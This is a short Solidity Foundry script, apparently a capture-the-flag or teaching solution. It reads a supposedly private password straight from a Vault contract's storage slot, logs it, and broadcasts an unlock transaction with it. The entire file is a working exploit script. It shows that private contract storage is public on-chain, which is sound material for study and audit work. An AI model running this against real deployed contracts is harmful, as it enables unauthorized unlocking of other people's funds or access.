// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {Vault} from "../src/Vault.sol";

contract HackVaultScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        Vault vault = helperConfig.getVaultConfig().vault;
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console.logBytes32(password);
        vm.startBroadcast();
        vault.unlock(password);
        vm.stopBroadcast();
    }
}
